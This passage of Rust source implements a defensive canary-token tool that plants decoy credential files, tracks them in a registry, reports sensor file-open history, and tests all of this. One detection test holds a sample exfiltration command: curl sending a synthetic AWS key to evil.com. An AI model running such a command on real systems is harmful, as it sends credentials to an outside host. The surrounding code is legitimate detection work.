    for token in &mut tokens {
        token.placements = placements.clone();
    }
    let old_len = registry.tokens.len();
    registry.tokens.extend(tokens);
    if let Err(error) = persist(registry) {
        registry.tokens.truncate(old_len);
        let mut errors = vec![format!("Registration failed: {error}")];
        for placement in &placements {
            if let Err(e) = remove_owned_placement(placement) {
                errors.push(e);
            }
        }
        return Err(errors.join("; "));
    }
    Ok(placements)
}

/// One temporary registration for an explicit installed-sensor test. Creating
/// the artifact only opens it for writing; the caller performs the read after
/// taking its sensor baseline. Cleanup is explicit so failures stay visible.
pub struct SelftestCanary {
    pub token_id: String,
    pub placement: CanaryPlacement,
    registered_token: CanaryToken,
    cleaned: bool,
}

impl SelftestCanary {
    pub fn create(dir: &Path) -> Result<Self, String> {
        let _lock = crate::encrypted_store::storage_lock(&registry_path().with_extension("lock"))?;
        let mut registry = load_registry_unlocked()?;
        Self::create_registered(dir, &mut registry, save_registry)
    }

    fn create_registered(
        dir: &Path,
        registry: &mut CanaryRegistry,
        persist: impl FnOnce(&CanaryRegistry) -> Result<(), String>,
    ) -> Result<Self, String> {
        validate_registry(registry)?;
        let mut token = CanaryToken {
            id: random_hex(32),
            token_type: CanaryType::GenericApiKey,
            value: format!("HEDGEHOG-SYNTHETIC-SELFTEST-{}", random_hex(32)),
            env_name: SELFTEST_ENV_NAME.into(),
            placements: Vec::new(),
            created_at: chrono::Utc::now().to_rfc3339(),
        };
        let placement = place_canaries(dir, std::slice::from_ref(&token))?
            .into_iter()
            .next()
            .ok_or("Self-test decoy was not created")?;
        token.placements.push(placement.clone());
        registry.tokens.push(token.clone());
        if let Err(error) = persist(registry) {
            registry.tokens.pop();
            let cleanup = remove_owned_placement(&placement);
            return Err(match cleanup {
                Ok(_) => format!("Self-test registration failed: {error}"),
                Err(cleanup) => format!("Self-test registration failed: {error}; {cleanup}"),
            });
        }
        Ok(Self {
            token_id: token.id.clone(),
            placement,
            registered_token: token,
            cleaned: false,
        })
    }

    /// Reload under the same lock as normal registry writers, preserving any
    /// registrations committed since creation. Modified or newly shared decoys
    /// are preserved and reported as a cleanup failure.
    pub fn cleanup(&mut self) -> Result<(), String> {
        if self.cleaned {
            return Ok(());
        }
        let _lock = crate::encrypted_store::storage_lock(&registry_path().with_extension("lock"))?;
        let mut registry = load_registry_unlocked()?;
        self.cleanup_registered(&mut registry, save_registry)
    }

    fn cleanup_registered(
        &mut self,
        registry: &mut CanaryRegistry,
        persist: impl FnOnce(&CanaryRegistry) -> Result<(), String>,
    ) -> Result<(), String> {
        if self.cleaned {
            return Ok(());
        }
        validate_registry(registry)?;
        let own_id = &self.registered_token.id;
        let index = registry.tokens.iter().position(|token| &token.id == own_id);
        if let Some(index) = index {
            if serde_json::to_vec(&registry.tokens[index]).map_err(|e| e.to_string())?
                != serde_json::to_vec(&self.registered_token).map_err(|e| e.to_string())?
            {
                return Err(
                    "Self-test registration was modified; registration and artifact preserved"
                        .into(),
                );
            }
        }
        let owned = &self.registered_token.placements[0];
        if registry.tokens.iter().any(|token| {
            &token.id != own_id
                && token.placements.iter().any(|placement| {
                    placement.id == owned.id
                        || placement.path == owned.path
                        || (owned.identity.is_some() && placement.identity == owned.identity)
                })
        }) {
            return Err(
                "Self-test artifact is referenced by another registration; preserved".into(),
            );
        }
        remove_owned_placement(owned)?;
        if let Some(index) = index {
            let token = registry.tokens.remove(index);
            if let Err(error) = persist(registry) {
                registry.tokens.insert(index, token);
                return Err(format!(
                    "Self-test artifact removed but registration cleanup failed: {error}"
                ));
            }
        }
        self.cleaned = true;
        Ok(())
    }
}

// --- CLI subcommands ---

/// `gorse canary create` — generate dedicated decoys and persist registration.
pub fn cmd_create(dir: Option<&str>) {
    let _lock = required_write_lock();
    let mut registry = load_registry_unlocked().unwrap_or_else(command_error);
    let target = dir
        .map(PathBuf::from)
        .unwrap_or_else(|| std::env::current_dir().unwrap_or_default());
    match create_registered(&target, &mut registry, save_registry) {
        Ok(placements) => {
            println!("Canary decoys registered. Registration does not prove the sensor or alarm delivery is working.");
            for placement in &placements {
                println!("  Created: {}", placement.path);
            }
            println!("Synthetic values provide local detection only; they do not trigger service-side alarms.");
        }
        Err(e) => {
            eprintln!("Canary creation failed: {e}");
            std::process::exit(1);
        }
    }
}

pub fn cmd_list() {
    let registry = required_registry();
    if registry.tokens.is_empty() {
        println!("No canary tokens registered.");
        return;
    }
    for token in &registry.tokens {
        println!("{}: {} ({})", token.id, token.env_name, token.token_type);
        for placement in &token.placements {
            println!(
                "  {}{}",
                placement.path,
                if placement.identity.is_none() {
                    " (legacy identity unverified)"
                } else {
                    ""
                }
            );
        }
    }
    println!(
        "{} registered tokens. Sensor and delivery health must be checked separately.",
        registry.tokens.len()
    );
}

#[derive(Debug, Deserialize)]
struct SensorHistoryEntry {
    placement_id: String,
    token_id: String,
    access: SensorHistoryAccess,
}

#[derive(Debug, Deserialize)]
struct SensorHistoryAccess {
    schema: u32,
    stream: String,
    sequence: u64,
    timestamp: String,
    event: String,
    path: String,
    pid: u32,
    executable: String,
}

fn valid_sensor_history(entry: &SensorHistoryEntry) -> bool {
    let valid_id = |id: &str| id.len() == 32 && id.bytes().all(|byte| byte.is_ascii_hexdigit());
    entry.access.schema == 1
        && entry.access.event == "canary_open"
        && entry.access.sequence > 0
        && !entry.access.stream.is_empty()
        && entry.access.stream.len() <= 64
        && entry
            .access
            .stream
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || byte == b'-')
        && valid_id(&entry.placement_id)
        && valid_id(&entry.token_id)
        && Path::new(&entry.access.path).is_absolute()
        && chrono::DateTime::parse_from_rfc3339(&entry.access.timestamp).is_ok()
}

/// Bounded local metadata history, including the previous rotated generation.
/// Corrupt entries remain visible errors without hiding valid adjacent records.
fn sensor_history(directory: &Path) -> (Vec<SensorHistoryEntry>, Vec<String>, bool) {
    let mut entries = std::collections::VecDeque::<SensorHistoryEntry>::new();
    let mut issues = Vec::new();
    let mut present = false;
    for name in ["canary-access.jsonl.previous", "canary-access.jsonl"] {
        let path = directory.join(name);
        match path_present(&path) {
            Ok(false) => continue,
            Ok(true) => present = true,
            Err(_) => {
                issues.push(format!("{name}: cannot inspect history"));
                continue;
            }
        }
        let bytes = match crate::encrypted_store::read_regular_file(&path) {
            Ok(bytes) if bytes.len() <= 4 * 1024 * 1024 + 64 * 1024 => bytes,
            Ok(_) => {
                issues.push(format!("{name}: exceeds bounded history size"));
                continue;
            }
            Err(_) => {
                issues.push(format!("{name}: history cannot be read safely"));
                continue;
            }
        };
        let mut invalid = false;
        for line in bytes.split_inclusive(|byte| *byte == b'\n') {
            if line.last() != Some(&b'\n') {
                issues.push(format!(
                    "{name}: incomplete final entry; retry after the writer completes"
                ));
                break;
            }
            if line.len() > 64 * 1024 {
                invalid = true;
                continue;
            }
            let entry = match serde_json::from_slice::<SensorHistoryEntry>(line) {
                Ok(entry) if valid_sensor_history(&entry) => entry,
                _ => {
                    invalid = true;
                    continue;
                }
            };
            // Each registered token gets a durable alarm. Display one local
            // file-open observation per sensor event and placement, including
            // when the daemon replays an event after restarting.
            if entries.iter().any(|previous| {
                previous.placement_id == entry.placement_id
                    && previous.access.stream == entry.access.stream
                    && previous.access.sequence == entry.access.sequence
            }) {
                continue;
            }
            entries.push_back(entry);
            if entries.len() > 20 {
                entries.pop_front();
            }
        }
        if invalid {
            issues.push(format!("{name}: corrupt or unsupported history entries"));
        }
    }
    (entries.into_iter().collect(), issues, present)
}

fn terminal_text(text: &str) -> String {
    text.chars()
        .take(240)
        .flat_map(char::escape_debug)
        .collect()
}

fn alert_history_lines(directory: &Path) -> (Vec<String>, bool) {
    let mut lines = Vec::new();
    let mut failed = false;
    let hook_path = directory.join("credential_alerts.json");
    let hook_alerts: Result<Vec<CanaryAlert>, String> = (|| {
        if !path_present(&hook_path)? {
            return Ok(Vec::new());
        }
        serde_json::from_slice(&crate::encrypted_store::read_regular_file(&hook_path)?)
            .map_err(|_| "corrupt hook observation history".into())
    })();
    lines.push("Hook observations (tool-input references; file access is not proven):".into());
    match hook_alerts {
        Ok(alerts) if alerts.is_empty() => lines.push("  No hook observations recorded.".into()),
        Ok(alerts) => {
            for alert in alerts.iter().rev().take(20) {
                lines.push(format!(
                    "  [{}] {} in {}",
                    terminal_text(&alert.timestamp),
                    terminal_text(&alert.token_type),
                    terminal_text(&alert.detected_in)
                ));
                lines.push(format!("    {}", terminal_text(&alert.context)));
            }
        }
        Err(_) => {
            lines.push("  Hook history unavailable or corrupt.".into());
            failed = true;
        }
    }
    lines.push(
        "Sensor observations (read-capable opens; not proof of bytes read or malicious intent):"
            .into(),
    );
    let (events, issues, present) = sensor_history(directory);
    if !present && issues.is_empty() {
        lines.push(
            "  Sensor history unavailable: no journal recorded. Sensing is unverified.".into(),
        );
    } else if events.is_empty() && issues.is_empty() {
        lines.push("  Sensor history contains no recorded read-opens.".into());
    }
    for event in events.iter().rev() {
        lines.push(format!(
            "  [{}] PID {}: {}",
            terminal_text(&event.access.timestamp),
            event.access.pid,
            terminal_text(&event.access.executable)
        ));
        lines.push(format!(
            "    {} (placement {})",
            terminal_text(&event.access.path),
            event.placement_id
        ));
    }
    for issue in issues {
        lines.push(format!("  Sensor history incomplete: {issue}"));
        failed = true;
    }
    lines.push("History does not establish current monitoring health or remote delivery. Run: gorse alerts status".into());
    (lines, failed)
}

pub fn cmd_alerts() {
    let (lines, failed) = alert_history_lines(&crate::config::config_dir());
    for line in lines {
        println!("{line}");
    }
    if failed {
        std::process::exit(1);
    }
}

pub fn cmd_remove() {
    let _lock = required_write_lock();
    let registry = load_registry_unlocked().unwrap_or_else(command_error);
    let mut seen = std::collections::HashSet::new();
    let mut removed = 0;
    let mut failed = false;
    for placement in registry.tokens.iter().flat_map(|t| &t.placements) {
        if seen.insert(&placement.path) {
            match remove_owned_placement(placement) {
                Ok(true) => removed += 1,
                Ok(false) => (),
                Err(e) => {
                    eprintln!("{e}");
                    failed = true;
                }
            }
        }
    }
    if failed {
        eprintln!("Removed {removed} unchanged decoys; registration retained because some files require review.");
        std::process::exit(1);
    }
    if let Err(e) = save_registry(&CanaryRegistry::default()) {
        eprintln!("Removed {removed} decoys, but registry could not be cleared: {e}");
        std::process::exit(1);
    }
    println!("Removed {removed} unchanged decoy files and cleared registration.");
}

fn command_error<T>(error: String) -> T {
    eprintln!("Canary operation failed: {error}");
    std::process::exit(1)
}

fn required_write_lock() -> crate::encrypted_store::StorageLock {
    crate::encrypted_store::storage_lock(&registry_path().with_extension("lock"))
        .unwrap_or_else(command_error)
}

#[cfg(test)]
mod tests {
    use super::*;

    struct TempDir(PathBuf);
    impl TempDir {
        fn new() -> Self {
            let path =
                std::env::temp_dir().join(format!("hedgehog-canary-test-{}", random_hex(32)));
            std::fs::create_dir(&path).unwrap();
            Self(path.canonicalize().unwrap())
        }
    }
    impl Drop for TempDir {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.0);
        }
    }

    fn legacy_bytes(path: &str) -> Vec<u8> {
        serde_json::to_vec(&serde_json::json!({"tokens":[{
            "token_type":"GenericApiKey", "value":"synthetic-credential", "env_name":"TEST_KEY",
            "placed_in":path, "created_at":"2026-01-01T00:00:00Z"
        }]}))
        .unwrap()
    }

    fn sensor_history_line(sequence: u64) -> Vec<u8> {
        let mut bytes = serde_json::to_vec(&serde_json::json!({
            "placement_id": "0123456789abcdef0123456789abcdef",
            "token_id": "abcdef0123456789abcdef0123456789",
            "access": {"schema":1,"stream":"synthetic-session","sequence":sequence,
                "timestamp":"2026-09-05T12:00:00Z","event":"canary_open","pid":123,
                "path":std::env::temp_dir().join(".hedgehog-canary-0123456789abcdef0123456789abcdef.txt"),
                "executable":"synthetic-reader\u{1b}[31m","device":1,"inode":2,"audit_token":"synthetic"}
        })).unwrap();
        bytes.push(b'\n');
        bytes
    }

    #[test]
    fn alert_history_includes_sensor_opens_without_hook_observations() {
        let dir = TempDir::new();
        std::fs::write(dir.0.join("canary-access.jsonl"), sensor_history_line(1)).unwrap();
        let (lines, failed) = alert_history_lines(&dir.0);
        assert!(!failed);
        assert!(lines
            .iter()
            .any(|line| line.contains("No hook observations")));
        assert!(lines.iter().any(|line| line.contains("PID 123")));
        assert!(!lines.iter().any(|line| line.contains("No canary alerts")));
        assert!(!lines.join("\n").contains('\u{1b}'));
    }

    #[test]
    fn sensor_history_is_bounded_rotated_and_replay_deduplicated() {
        let dir = TempDir::new();
        let previous: Vec<u8> = (1..=15).flat_map(sensor_history_line).collect();
        let current: Vec<u8> = (15..=25).flat_map(sensor_history_line).collect();
        std::fs::write(dir.0.join("canary-access.jsonl.previous"), previous).unwrap();
        std::fs::write(dir.0.join("canary-access.jsonl"), current).unwrap();
        let (events, issues, present) = sensor_history(&dir.0);
        assert!(present);
        assert!(issues.is_empty());
        assert_eq!(events.len(), 20);
        assert_eq!(events[0].access.sequence, 6);
        assert_eq!(events[19].access.sequence, 25);
    }

    #[test]
    fn missing_corrupt_and_partial_sensor_history_are_explicit() {
        let dir = TempDir::new();
        let (lines, failed) = alert_history_lines(&dir.0);
        assert!(!failed);
        assert!(lines
            .iter()
            .any(|line| line.contains("Sensing is unverified")));
        let mut bytes = b"malformed\n".to_vec();
        bytes.extend(sensor_history_line(1));
        bytes.extend(b"{\"partial\":");
        std::fs::write(dir.0.join("canary-access.jsonl"), bytes).unwrap();
        std::fs::write(dir.0.join("credential_alerts.json"), b"corrupt").unwrap();
        let (lines, failed) = alert_history_lines(&dir.0);
        assert!(failed);
        assert!(lines.iter().any(|line| line.contains("PID 123")));
        assert!(lines
            .iter()
            .any(|line| line.contains("corrupt or unsupported")));
        assert!(lines
            .iter()
            .any(|line| line.contains("incomplete final entry")));
        assert!(lines
            .iter()
            .any(|line| line.contains("Hook history unavailable")));
    }

    #[test]
    fn explicit_multiple_placements_roundtrip_with_comma_paths() {
        let dir = TempDir::new();
        let comma_dir = dir.0.join("project, one");
        std::fs::create_dir(&comma_dir).unwrap();
        let mut tokens = generate_canaries();
        let mut placements = place_canaries(&comma_dir, &tokens).unwrap();
        placements.extend(place_canaries(&dir.0, &tokens).unwrap());
        for token in &mut tokens {
            token.placements = placements.clone();
        }
        let registry = CanaryRegistry {
            version: REGISTRY_VERSION,
            tokens,
        };
        let bytes = serde_json::to_vec(&registry).unwrap();
        let (loaded, migrated) = decode_registry(&bytes).unwrap();
        assert!(!migrated);
        assert_eq!(loaded.tokens[0].id, registry.tokens[0].id);
        assert_eq!(loaded.tokens[0].placements.len(), 2);
        assert!(loaded.tokens[0].placements[0].path.contains("project, one"));
        assert_ne!(placements[0].id, placements[1].id);
    }

    #[test]
    fn legacy_single_path_migrates_once_and_has_no_deletion_authority() {
        let dir = TempDir::new();
        let encrypted = dir.0.join("monitor.enc");
        let legacy = dir.0.join("canaries.json");
        let decoy = dir.0.join("old-credential");
        std::fs::write(&decoy, "synthetic-credential").unwrap();
        std::fs::write(&legacy, legacy_bytes(decoy.to_str().unwrap())).unwrap();
        let migrated = load_registry_at(
            &encrypted,
            &legacy,
            crate::encrypted_store::read_regular_file,
            crate::encrypted_store::write_private_atomic,
        )
        .unwrap();
        assert!(!legacy.exists());
        assert!(migrated.tokens[0].placements[0].identity.is_none());
        assert!(remove_owned_placement(&migrated.tokens[0].placements[0]).is_err());
        assert!(decoy.exists());
        let reloaded = load_registry_at(
            &encrypted,
            &legacy,
            crate::encrypted_store::read_regular_file,
            |_, _| panic!("already migrated"),
        )
        .unwrap();
        assert_eq!(reloaded.tokens[0].id, migrated.tokens[0].id);
        assert_eq!(
            reloaded.tokens[0].placements[0].id,
            migrated.tokens[0].placements[0].id
        );
    }

    #[test]
    fn ambiguous_legacy_paths_and_failed_migrations_preserve_original() {
        let dir = TempDir::new();
        let encrypted = dir.0.join("monitor.enc");
        let legacy = dir.0.join("canaries.json");
        let ambiguous = legacy_bytes("/tmp/a, /tmp/b");
        std::fs::write(&legacy, &ambiguous).unwrap();
        assert!(load_registry_at(
            &encrypted,
            &legacy,
            |_| panic!("not encrypted"),
            |_, _| panic!("do not persist guesses")
        )
        .is_err());
        assert_eq!(std::fs::read(&legacy).unwrap(), ambiguous);
        let single = legacy_bytes(dir.0.join("single").to_str().unwrap());
        std::fs::write(&legacy, &single).unwrap();
        assert!(load_registry_at(
            &encrypted,
            &legacy,
            |_| panic!("not encrypted"),
            |_, _| Err("disk full".into())
        )
        .is_err());
        assert_eq!(std::fs::read(&legacy).unwrap(), single);
        assert!(!encrypted.exists());
        assert!(decode_registry(&legacy_bytes("relative/path")).is_err());
    }

    #[test]
    fn corrupt_encrypted_registry_never_falls_back_to_legacy() {
        let dir = TempDir::new();
        let encrypted = dir.0.join("monitor.enc");
        let legacy = dir.0.join("canaries.json");
        std::fs::write(&encrypted, b"damaged ciphertext").unwrap();
        std::fs::write(&legacy, legacy_bytes(dir.0.join("old").to_str().unwrap())).unwrap();
        assert!(load_registry_at(
            &encrypted,
            &legacy,
            |_| Err("authentication failed".into()),
            |_, _| panic!("must not overwrite")
        )
        .is_err());
        assert_eq!(std::fs::read(&encrypted).unwrap(), b"damaged ciphertext");
        assert!(legacy.exists());
        assert!(decode_registry(br#"{"version":99,"tokens":[]}"#).is_err());
        assert!(decode_registry(br#"{"version":2}"#).is_err());
        let mut tokens = generate_canaries();
        let placement = place_canaries(&dir.0, &tokens).unwrap().remove(0);
        tokens[0].placements.push(placement.clone());
        tokens[1].placements.push(placement);
        // Same placement ID, different path: inconsistent on every platform.
        // (On non-unix hosts expected_content is already None, so clearing it
        // would not change anything.)
        tokens[1].placements[0].path = dir.0.join("elsewhere").to_string_lossy().into_owned();
        let inconsistent = CanaryRegistry {
            version: REGISTRY_VERSION,
            tokens,
        };
        assert!(decode_registry(&serde_json::to_vec(&inconsistent).unwrap()).is_err());
    }

    #[test]
    fn dedicated_placement_does_not_create_or_overwrite_active_config() {
        let dir = TempDir::new();
        std::fs::write(dir.0.join(".env"), "REAL=untouched").unwrap();
        let placements = place_canaries(&dir.0, &generate_canaries()).unwrap();
        assert_eq!(placements.len(), 1);
        let path = Path::new(&placements[0].path);
        assert!(path
            .file_name()
            .unwrap()
            .to_str()
            .unwrap()
            .starts_with(".hedgehog-canary-"));
        assert_eq!(
            std::fs::read_to_string(dir.0.join(".env")).unwrap(),
            "REAL=untouched"
        );
        assert!(!dir.0.join(".env.local").exists());
        assert!(!dir.0.join(".aws").exists());
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            assert_eq!(
                std::fs::metadata(path).unwrap().permissions().mode() & 0o777,
                0o600
            );
        }
    }

    #[cfg(unix)]
    #[test]
    fn failed_registration_rolls_back_only_its_own_unchanged_artifact() {
        let dir = TempDir::new();
        let mut registry = CanaryRegistry::default();
        assert!(create_registered(&dir.0, &mut registry, |_| Err("disk full".into())).is_err());
        assert!(registry.tokens.is_empty());
        assert_eq!(std::fs::read_dir(&dir.0).unwrap().count(), 0);
        let error = create_registered(&dir.0, &mut registry, |candidate| {
            std::fs::write(
                &candidate.tokens[0].placements[0].path,
                "changed content to preserve",
            )
            .unwrap();
            Err("registry write failed".into())
        })
        .unwrap_err();
        assert!(error.contains("Preserved"));
        let path = std::fs::read_dir(&dir.0)
            .unwrap()
            .next()
            .unwrap()
            .unwrap()
            .path();
        assert_eq!(
            std::fs::read_to_string(path).unwrap(),
            "changed content to preserve"
        );
    }

    #[cfg(unix)]
    #[test]
    fn selftest_registers_one_synthetic_token_and_preserves_later_registrations() {
        let dir = TempDir::new();
        let mut registry = CanaryRegistry::default();
        create_registered(&dir.0, &mut registry, |_| Ok(())).unwrap();
        let original = serde_json::to_value(&registry.tokens).unwrap();
        let count = registry.tokens.len();
        let mut probe = SelftestCanary::create_registered(&dir.0, &mut registry, |candidate| {
            assert_eq!(candidate.tokens.len(), count + 1);
            Ok(())
        })
        .unwrap();
        assert_eq!(registry.tokens[count].placements.len(), 1);
        assert_eq!(registry.tokens[count].env_name, SELFTEST_ENV_NAME);
        assert!(registry.tokens[count]
            .value
            .starts_with("HEDGEHOG-SYNTHETIC-SELFTEST-"));
        assert_eq!(registry.tokens[count].id, probe.token_id);
        assert_eq!(registry.tokens[count].placements[0], probe.placement);
        let mut later =
            SelftestCanary::create_registered(&dir.0, &mut registry, |_| Ok(())).unwrap();
        probe.cleanup_registered(&mut registry, |_| Ok(())).unwrap();
        assert!(!Path::new(&probe.placement.path).exists());
        assert!(Path::new(&later.placement.path).exists());
        assert_eq!(registry.tokens.len(), count + 1);
        assert_eq!(
            serde_json::to_value(&registry.tokens[..count]).unwrap(),
            original
        );
        assert_eq!(registry.tokens[count].id, later.token_id);
        probe
            .cleanup_registered(&mut registry, |_| panic!("cleanup should be idempotent"))
            .unwrap();
        later.cleanup_registered(&mut registry, |_| Ok(())).unwrap();
    }

    #[cfg(unix)]
    #[test]
    fn selftest_registration_failure_rolls_back_only_unchanged_decoy() {
        let dir = TempDir::new();
        let mut registry = CanaryRegistry::default();
        create_registered(&dir.0, &mut registry, |_| Ok(())).unwrap();
        let original = serde_json::to_value(&registry).unwrap();
        assert!(
            SelftestCanary::create_registered(&dir.0, &mut registry, |_| {
                Err("synthetic persistence failure".into())
            })
            .is_err()
        );
        assert_eq!(serde_json::to_value(&registry).unwrap(), original);
        assert_eq!(std::fs::read_dir(&dir.0).unwrap().count(), 1);
        let mut modified_path = None;
        assert!(
            SelftestCanary::create_registered(&dir.0, &mut registry, |candidate| {
                let path = &candidate.tokens.last().unwrap().placements[0].path;
                std::fs::write(path, "preserved user edit").unwrap();
                modified_path = Some(path.clone());
                Err("synthetic persistence failure".into())
            })
            .is_err()
        );
        assert_eq!(serde_json::to_value(&registry).unwrap(), original);
        assert_eq!(
            std::fs::read_to_string(modified_path.unwrap()).unwrap(),
            "preserved user edit"
        );
    }

    #[cfg(unix)]
    #[test]
    fn selftest_cleanup_preserves_edited_artifact_and_registration() {
        let dir = TempDir::new();
        let mut registry = CanaryRegistry::default();
        let mut probe =
            SelftestCanary::create_registered(&dir.0, &mut registry, |_| Ok(())).unwrap();
        let original = serde_json::to_value(&registry).unwrap();
        std::fs::write(&probe.placement.path, "new user data").unwrap();
        assert!(probe
            .cleanup_registered(&mut registry, |_| panic!(
                "edited artifact must be preserved"
            ))
            .is_err());
        assert_eq!(
            std::fs::read_to_string(&probe.placement.path).unwrap(),
            "new user data"
        );
        assert_eq!(serde_json::to_value(&registry).unwrap(), original);

        registry.tokens[0].env_name = "USER_EDITED_LABEL".into();
        let modified = serde_json::to_value(&registry).unwrap();
        assert!(probe.cleanup_registered(&mut registry, |_| Ok(())).is_err());
        assert_eq!(serde_json::to_value(&registry).unwrap(), modified);
    }

    #[cfg(unix)]
    #[test]
    fn selftest_cleanup_preserves_artifact_referenced_by_concurrent_registration() {
        let dir = TempDir::new();
        let mut registry = CanaryRegistry::default();
        let mut probe =
            SelftestCanary::create_registered(&dir.0, &mut registry, |_| Ok(())).unwrap();
        let mut adopted = registry.tokens[0].clone();
        adopted.id = random_hex(32);
        registry.tokens.push(adopted);
        let original = serde_json::to_value(&registry).unwrap();
        assert!(probe.cleanup_registered(&mut registry, |_| Ok(())).is_err());
        assert!(Path::new(&probe.placement.path).exists());
        assert_eq!(serde_json::to_value(&registry).unwrap(), original);
    }

    #[cfg(unix)]
    #[test]
    fn selftest_cleanup_persistence_failure_retains_registration_for_retry() {
        let dir = TempDir::new();
        let mut registry = CanaryRegistry::default();
        let mut probe =
            SelftestCanary::create_registered(&dir.0, &mut registry, |_| Ok(())).unwrap();
        let original = serde_json::to_value(&registry).unwrap();
        assert!(probe
            .cleanup_registered(&mut registry, |_| Err("synthetic failure".into()))
            .is_err());
        assert_eq!(serde_json::to_value(&registry).unwrap(), original);
        assert!(!probe.cleaned);
        probe.cleanup_registered(&mut registry, |_| Ok(())).unwrap();
        assert!(registry.tokens.is_empty());
        assert!(probe.cleaned);
    }

    #[cfg(unix)]
    #[test]
    fn removal_checks_content_inode_and_symlinks() {
        let dir = TempDir::new();
        let tokens = generate_canaries();
        let unchanged = place_canaries(&dir.0, &tokens).unwrap().remove(0);
        assert!(remove_owned_placement(&unchanged).unwrap());
        assert!(!Path::new(&unchanged.path).exists());

        let modified = place_canaries(&dir.0, &tokens).unwrap().remove(0);
        std::fs::write(&modified.path, "user data").unwrap();
        assert!(remove_owned_placement(&modified).is_err());
        assert_eq!(
            std::fs::read_to_string(&modified.path).unwrap(),
            "user data"
        );

        let replaced = place_canaries(&dir.0, &tokens).unwrap().remove(0);
        let original = dir.0.join("original");
        std::fs::rename(&replaced.path, &original).unwrap();
        std::fs::write(&replaced.path, replaced.expected_content.as_ref().unwrap()).unwrap();
        assert!(remove_owned_placement(&replaced).is_err());
        assert!(Path::new(&replaced.path).exists());
        std::fs::remove_file(&replaced.path).unwrap();
        std::os::unix::fs::symlink(&original, &replaced.path).unwrap();
        assert!(remove_owned_placement(&replaced).is_err());
        assert!(original.exists());
    }

    #[test]
    fn generates_valid_aws_key() {
        let canaries = generate_canaries();
        let aws = canaries
            .iter()
            .find(|c| c.env_name == "AWS_ACCESS_KEY_ID")
            .unwrap();
        assert!(aws.value.starts_with("AKIA"));
        assert_eq!(aws.value.len(), 20); // AKIA + 16
    }

    #[test]
    fn generates_aws_secret_key() {
        let canaries = generate_canaries();
        let secret = canaries
            .iter()
            .find(|c| c.env_name == "AWS_SECRET_ACCESS_KEY")
            .unwrap();
        assert_eq!(secret.value.len(), 40); // realistic length
    }

    #[test]
    fn generates_valid_stripe_key() {
        let canaries = generate_canaries();
        let stripe = canaries
            .iter()
            .find(|c| c.env_name == "STRIPE_SECRET_KEY")
            .unwrap();
        assert!(stripe.value.starts_with("sk_live_"));
        assert_eq!(stripe.value.len(), 32); // sk_live_ + 24
    }

    #[test]
    fn generates_valid_github_pat() {
        let canaries = generate_canaries();
        let ghp = canaries
            .iter()
            .find(|c| c.env_name == "GITHUB_TOKEN")
            .unwrap();
        assert!(ghp.value.starts_with("ghp_"));
        assert_eq!(ghp.value.len(), 40); // ghp_ + 36
    }

    #[test]
    fn generates_database_url() {
        let canaries = generate_canaries();
        let db = canaries
            .iter()
            .find(|c| c.env_name == "DATABASE_URL")
            .unwrap();
        assert!(db.value.starts_with("postgres://"));
    }

    #[test]
    fn generates_sendgrid_key() {
        let canaries = generate_canaries();
        let sg = canaries
            .iter()
            .find(|c| c.env_name == "SENDGRID_API_KEY")
            .unwrap();
        assert!(sg.value.starts_with("SG."));
    }

    #[test]
    fn canaries_are_unique() {
        let c1 = generate_canaries();
        let c2 = generate_canaries();
        // Each generation should produce different values
        assert_ne!(c1[0].value, c2[0].value);
    }

    #[test]
    fn detects_canary_in_text() {
        // Create a token and check for it in text
        let token = CanaryToken {
            id: random_hex(32),
            token_type: CanaryType::AwsAccessKey,
            value: "AKIAIOSFODNN7TESTCAN".to_string(),
            env_name: "AWS_ACCESS_KEY_ID".to_string(),
            placements: Vec::new(),
            created_at: "2026-01-01T00:00:00Z".to_string(),
        };

        let text = "curl -H 'Authorization: AKIAIOSFODNN7TESTCAN' https://evil.com";
        assert!(text.contains(&token.value));
    }

    #[test]
    fn random_alnum_correct_length() {
        assert_eq!(random_alnum(16).len(), 16);
        assert_eq!(random_alnum(36).len(), 36);
    }

    #[test]
    fn random_hex_correct_length() {
        let h = random_hex(40);
        assert_eq!(h.len(), 40);
        assert!(h.chars().all(|c| c.is_ascii_hexdigit()));
    }
}
